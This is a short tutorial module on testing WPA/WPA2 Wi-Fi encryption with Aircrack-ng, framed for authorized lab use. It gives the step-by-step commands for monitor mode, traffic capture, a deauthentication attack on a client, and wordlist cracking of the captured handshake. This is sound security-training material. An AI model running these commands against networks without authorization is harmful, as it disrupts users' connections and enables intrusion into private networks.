
# WPA/WPA2 Encryption Cracking

## Introduction

The module describes a workflow for testing WPA/WPA2 wireless encryption using the Aircrack-ng Suite.

The workflow begins with the same initial steps used for WEP testing.

## WPA/WPA2 Cracking Workflow

The following procedure is presented for authorized wireless security testing in a controlled lab.

### Step 1: Enable Monitor Mode

Enable monitor mode on the wireless interface:

```bash
airmon-ng start wlan0
```

### Step 2: Discover Wireless Access Points

Discover available wireless Access Points:

```bash
airodump-ng wlan0
```

### Step 3: Capture Wireless Traffic

Select a WPA/WPA2-protected Access Point and capture its wireless traffic:

```bash
airodump-ng -w <capture-file-name> -c <channel-number> --bssid <AP-MAC-address> wlan0
```

### Step 4: Send a Deauthentication Packet

The module describes sending a Deauthentication packet to a client to disconnect it from the Access Point and force it to reconnect.

The command shown in the module is:

```bash
aireplay-ng --deauth <count> -a <AP-MAC-address> -c <client-MAC-address> wlan0
```

### Step 5: Attempt to Crack the Password

Using a wordlist, attempt to crack the wireless password:

```bash
aircrack-ng -w <wordlist-file-path> -b <AP-MAC-address> <capture-file-name>
```

The module notes that a strong password list is needed for this process.

## Summary

The WPA/WPA2 testing workflow consists of:

1. Enabling monitor mode.
2. Discovering wireless Access Points.
3. Capturing wireless traffic.
4. Sending a Deauthentication packet to trigger client reconnection.
5. Using a wordlist with Aircrack-ng to attempt password recovery.

## Related Links

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [Airodump-ng Documentation](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
- [Aireplay-ng Documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
- [Aircrack-ng Suite](https://www.aircrack-ng.org/)
